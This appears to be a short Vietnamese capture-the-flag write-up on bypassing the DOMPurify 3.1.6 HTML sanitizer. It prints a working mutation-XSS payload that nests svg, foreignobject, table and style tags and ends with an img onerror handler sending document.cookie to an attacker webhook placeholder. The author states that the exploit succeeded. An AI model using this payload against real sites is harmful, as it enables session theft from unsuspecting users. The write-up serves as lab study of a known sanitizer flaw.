X Ec Ec
Thử thách này khiến mình cảm thấy khó khăn là bởi vì ban đầu mình cứ nghĩ là nó sẽ thực hiện bypass các thẻ cùng với sự kiện nhưng thực ra không phải
![image](https://github.com/user-attachments/assets/b629dd21-d3d9-40b9-9547-0f189138ffae)

Đối với thử thách này, nó cho biết nó sử dụng dompurify 3.1.6 nên mình  vào https://github.com/cure53/DOMPurify/releases và xem masatokinugawabáo cáo đó. Sau đó, mình vào đó và xem payload.

Mình phát hiện ra rằng dompurify là một thư viện giúp chặn một số tab hay event có thể xảy ra lỗi XSS, và theo nghiên cứu thì tính năng đã gặp một lỗi xuất hiện trong CVE nó chính là lợi dụng
sự bao bọc của nhiều thẻ và thực hiện việc XSS từ bên trong sẽ vượt qua được vòng lọc của dompurify này:
Sau đây là một ví dụ payload khai thác mà mình đã dùng để vượt qua thử thách :

        <svg>
        <a>
        <foreignobject>
        <a>
        <table>
        <a>
        </table>
        <style><!--</style>
        </svg>
        <a id="-><img src onerror=location.href=YOUR_WEBHOOK+document.cookie>">
ta có thể thấy là payload này thực hiện một số thao tác lồng các thẻ hợp lệ mà dompurify cho phép một cách phức tạp để rồi sau đó thực hiện một thao tác đó là gửi lắng nghe sự kiện onerror để gửi document.cookie lên webhook của hacker.
Và mình đã thành công khai thác được nó.
        
